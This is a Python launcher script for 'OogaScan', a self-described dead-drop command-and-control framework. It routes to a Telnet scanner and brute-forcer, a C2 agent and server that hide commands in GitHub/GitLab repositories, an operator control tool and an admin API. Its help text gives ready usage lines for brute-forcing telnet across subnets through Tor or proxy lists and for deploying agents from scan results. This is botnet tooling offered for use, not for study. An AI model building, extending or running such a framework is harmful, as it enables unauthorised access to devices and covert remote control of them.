#!/usr/bin/env python3
"""
OogaScan — Zero-Width Dead-Drop C2 Framework

Unified entry point for all components:
  c2        — GitHub/GitLab dead-drop C2 (PasteBomb)
  control   — Operator control tool (push commands to repos)
  api       — REST API for admin & lints dashboards
"""

import sys
import argparse

if sys.version_info < (3, 10):
    print("Error: Python 3.10+ required")
    sys.exit(1)

BANNER = """\033[1;36m
   ██████   ██████   ██████   █████  ███████  ██████  █████  ███    ██
  ██    ██ ██    ██ ██       ██   ██ ██      ██      ██   ██ ████   ██
  ██    ██ ██    ██ ██   ███ ███████ ███████ ██      ███████ ██ ██  ██
  ██    ██ ██    ██ ██    ██ ██   ██      ██ ██      ██   ██ ██  ██ ██
   ██████   ██████   ██████  ██   ██ ███████  ██████ ██   ██ ██   ████

                  Zero-Width Dead-Drop C2 Framework
\033[0m"""


def main():
    parser = argparse.ArgumentParser(
        description="OogaScan — Zero-Width Dead-Drop C2 Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
modules:
  scan       Telnet scanner & brute-forcer
  c2         GitHub/GitLab dead-drop C2 (agent/server/deploy)
  control    Operator tool — push commands to repos
  api        REST API for admin & lints dashboards
  config     Generate default scanner config

examples:
  %(prog)s scan -T 192.168.1.0/24
  %(prog)s scan --scan-only --ports 23,2323
  %(prog)s scan --proxy socks5://127.0.0.1:9050
  %(prog)s scan --proxy-file proxies.txt
  %(prog)s c2 agent -r user/repo1 -r gl:user/backup-repo
  %(prog)s c2 server
  %(prog)s c2 deploy -f results.jsonl -r user/c2-repo
  %(prog)s control
  %(prog)s api
  %(prog)s config
""",
    )
    parser.add_argument("module", nargs="?", default="c2",
                        choices=["c2", "control", "api", "scan", "config"],
                        help="Module to run (default: c2)")

    args, remaining = parser.parse_known_args()

    print(BANNER)

    if args.module == "c2":
        sys.argv = [sys.argv[0]] + remaining
        from pastebomb import main as pb_main
        pb_main()

    elif args.module == "control":
        sys.argv = [sys.argv[0]] + remaining
        from control import main as ctrl_main
        ctrl_main()

    elif args.module == "api":
        sys.argv = [sys.argv[0]] + remaining
        from api import main as api_main
        api_main()

    elif args.module == "scan":
        sys.argv = [sys.argv[0]] + remaining
        from csan import main as scan_main
        scan_main()

    elif args.module == "config":
        from config import OogaConfig, DEFAULT_CONFIG_PATH
        cfg = OogaConfig()
        cfg.save()
        print(f"  Default scanner config saved to {DEFAULT_CONFIG_PATH}")
        print(f"  Edit the file, then run: {sys.argv[0]} scan -T <target>")


if __name__ == "__main__":
    main()
